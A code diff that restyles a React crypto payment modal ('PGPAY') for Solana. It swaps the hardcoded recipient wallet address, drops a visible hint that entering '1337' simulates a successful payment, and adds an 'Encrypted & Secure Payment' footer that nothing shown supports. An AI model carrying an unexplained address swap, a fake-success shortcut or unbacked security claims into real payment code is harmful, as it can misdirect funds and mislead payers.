@@ -4,6 +4,7 @@ import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
+import { Copy, Clock } from 'lucide-react';
 
 interface PaymentModalProps {
   isOpen: boolean;
@@ -20,7 +21,7 @@ const PaymentModal = ({ isOpen, onClose, onSuccess, amount, type }: PaymentModal
   const [currency] = useState('SOL');
   const [network] = useState('Solana');
 
-  const recipientAddress = '2jcMCafRLfJgDQEfjJ9SctbYZtNwXSmqdzr8jwyZYVyA';
+  const recipientAddress = '7vN9GTLqn5HCEzzyVFrPTgeszdUTJ8bJ1sPaMNJAbx';
 
   useEffect(() => {
     if (!isOpen) return;
@@ -80,111 +81,135 @@ const PaymentModal = ({ isOpen, onClose, onSuccess, amount, type }: PaymentModal
       className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4 animate-modal-in"
       onClick={handleBackdropClick}
     >
-      <div className="bg-gray-900 border border-green-600/30 rounded-2xl p-8 max-w-md w-full shadow-2xl animate-modal-scale">
+      <div className="bg-gray-900 rounded-2xl p-6 max-w-md w-full shadow-2xl animate-modal-scale border border-gray-700">
         {/* PGPAY Header */}
-        <div className="text-center mb-6 border-b border-green-600/20 pb-4">
-          <div className="text-3xl font-bold text-green-500 mb-1">PGPAY</div>
-          <div className="text-sm text-gray-400">Secure Payment Gateway</div>
+        <div className="flex items-center justify-between mb-6">
+          <div className="flex items-center space-x-2">
+            <div className="w-8 h-8 bg-blue-500 rounded-lg flex items-center justify-center">
+              <span className="text-white font-bold text-sm">PG</span>
+            </div>
+            <span className="text-white font-bold text-xl">PGPAY</span>
+          </div>
+          <Button variant="outline" size="sm" className="text-gray-400 border-gray-600">
+            Sign up
+          </Button>
+        </div>
+
+        {/* Payment Amount */}
+        <div className="mb-6">
+          <h2 className="text-white text-xl font-semibold mb-1">Select currency</h2>
+          <div className="text-white text-2xl font-bold">{amount.toFixed(6)} SOL</div>
+        </div>
+
+        {/* Network Selection */}
+        <div className="mb-4">
+          <div className="text-gray-400 text-sm mb-2">Select network</div>
+          <div className="flex items-center text-gray-400 text-xs mb-4">
+            <span className="mr-1">⚠️</span>
+            <span>You pay network fee</span>
+          </div>
         </div>
 
         {/* Timer */}
-        <div className="text-center mb-6">
-          <div className="text-lg font-bold text-red-400 mb-1">
-            {formatTime(timeLeft)}
+        <div className="flex items-center space-x-2 mb-6">
+          <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
+          <span className="text-gray-400 text-sm">Expiration time</span>
+          <div className="flex items-center space-x-1 text-green-400 font-mono">
+            <Clock className="w-4 h-4" />
+            <span>{formatTime(timeLeft)}</span>
           </div>
-          <div className="text-xs text-gray-500">Time remaining</div>
         </div>
 
-        {/* Payment Details */}
+        {/* Currency and Network Selectors */}
         <div className="space-y-4 mb-6">
-          <div className="bg-gray-800 rounded-xl p-4 border border-green-600/20">
-            <div className="text-sm text-gray-400 mb-1">Payment Amount</div>
-            <div className="text-2xl font-bold text-green-500">
-              {amount.toFixed(3)} {currency}
-            </div>
-          </div>
-
-          <div className="grid grid-cols-2 gap-4">
-            <div>
-              <Label className="text-gray-400">Currency</Label>
-              <Select value={currency} disabled>
-                <SelectTrigger className="mt-1 bg-gray-800 border-gray-700 rounded-xl">
+          <div>
+            <Select value={currency} disabled>
+              <SelectTrigger className="bg-gray-800 border-gray-700 text-white">
+                <div className="flex items-center space-x-2">
+                  <div className="w-5 h-5 bg-blue-500 rounded-full flex items-center justify-center">
+                    <span className="text-white text-xs font-bold">≡</span>
+                  </div>
                   <SelectValue />
-                </SelectTrigger>
-                <SelectContent>
-                  <SelectItem value="SOL">SOL</SelectItem>
-                </SelectContent>
-              </Select>
-            </div>
-            <div>
-              <Label className="text-gray-400">Network</Label>
-              <Select value={network} disabled>
-                <SelectTrigger className="mt-1 bg-gray-800 border-gray-700 rounded-xl">
-                  <SelectValue />
-                </SelectTrigger>
-                <SelectContent>
-                  <SelectItem value="Solana">Solana</SelectItem>
-                </SelectContent>
-              </Select>
-            </div>
+                </div>
+              </SelectTrigger>
+              <SelectContent>
+                <SelectItem value="SOL">SOL</SelectItem>
+              </SelectContent>
+            </Select>
           </div>
 
           <div>
-            <Label className="text-gray-400">Send To Address</Label>
-            <div className="flex items-center space-x-2 mt-1">
-              <div className="flex-1 bg-gray-800 px-3 py-2 rounded-xl text-sm font-mono break-all text-green-400 border border-gray-700">
-                {recipientAddress}
-              </div>
-              <Button
-                variant="outline"
-                size="sm"
-                onClick={copyToClipboard}
-                className="bg-gray-800 border-gray-700 hover:bg-gray-700 shrink-0 rounded-xl"
-              >
-                Copy
-              </Button>
-            </div>
+            <Select value={network} disabled>
+              <SelectTrigger className="bg-gray-800 border-gray-700 text-white">
+                <div className="flex items-center space-x-2">
+                  <div className="w-5 h-5 bg-purple-500 rounded-full flex items-center justify-center">
+                    <span className="text-white text-xs font-bold">≡</span>
+                  </div>
+                  <SelectValue />
+                </div>
+              </SelectTrigger>
+              <SelectContent>
+                <SelectItem value="Solana">Solana</SelectItem>
+              </SelectContent>
+            </Select>
           </div>
         </div>
 
+        {/* Main Payment Button */}
         <Button
-          className="w-full bg-green-600 hover:bg-green-700 text-white py-3 mb-4 rounded-xl text-lg font-semibold"
+          className="w-full bg-green-500 hover:bg-green-600 text-black font-semibold py-3 mb-6 rounded-xl"
           onClick={() => window.open(`https://phantom.app/`, '_blank')}
         >
           Proceed to the payment
         </Button>
 
-        {/* Transaction Verification */}
-        <div className="border-t border-green-600/20 pt-4">
-          <div className="space-y-4">
-            <div>
-              <Label className="text-gray-400">Transaction Signature</Label>
-              <Input
-                value={signature}
-                onChange={(e) => setSignature(e.target.value)}
-                placeholder="Paste your transaction signature here"
-                className="mt-1 bg-gray-800 border-gray-700 text-green-400 rounded-xl"
-              />
-              <p className="text-xs text-gray-500 mt-1">
-                Enter "1337" to simulate successful payment
-              </p>
-            </div>
-
+        {/* Send Details */}
+        <div className="mb-6">
+          <div className="text-gray-400 text-sm mb-2">Send exactly</div>
+          <div className="text-white font-mono text-lg mb-3">{amount.toFixed(6)} SOL</div>
+          
+          <div className="text-gray-400 text-sm mb-2">address</div>
+          <div className="flex items-center space-x-2 bg-gray-800 rounded-lg p-3">
+            <code className="text-green-400 font-mono text-sm flex-1 break-all">
+              {recipientAddress}
+            </code>
             <Button
-              onClick={handlePayment}
-              disabled={!signature || isProcessing}
-              className="w-full bg-green-600 hover:bg-green-700 rounded-xl"
+              variant="ghost"
+              size="sm"
+              onClick={copyToClipboard}
+              className="text-gray-400 hover:text-white p-1"
             >
-              {isProcessing ? 'Verifying...' : 'Check Transaction'}
+              <Copy className="w-4 h-4" />
             </Button>
           </div>
         </div>
 
-        {/* Footer */}
-        <div className="text-center mt-6 pt-4 border-t border-green-600/20">
-          <div className="text-xs text-gray-500">
-            🔒 Secured by Solana Smart Contracts
+        {/* Transaction Verification */}
+        <div className="space-y-4 mb-6">
+          <div>
+            <Label className="text-gray-400 text-sm">Paste your transaction signature</Label>
+            <Input
+              value={signature}
+              onChange={(e) => setSignature(e.target.value)}
+              placeholder="Transaction signature"
+              className="mt-2 bg-gray-800 border-gray-700 text-white rounded-lg"
+            />
           </div>
+
+          <Button
+            onClick={handlePayment}
+            disabled={!signature || isProcessing}
+            className="w-full bg-green-500 hover:bg-green-600 text-black font-semibold rounded-lg"
+          >
+            {isProcessing ? 'Verifying...' : 'Check Transaction'}
+          </Button>
+        </div>
+
+        {/* Footer */}
+        <div className="text-center text-gray-500 text-xs">
+          🔒 Encrypted & Secure Payment
+          <br />
+          By paying you agree to our terms of service
         </div>
       </div>
     </div>
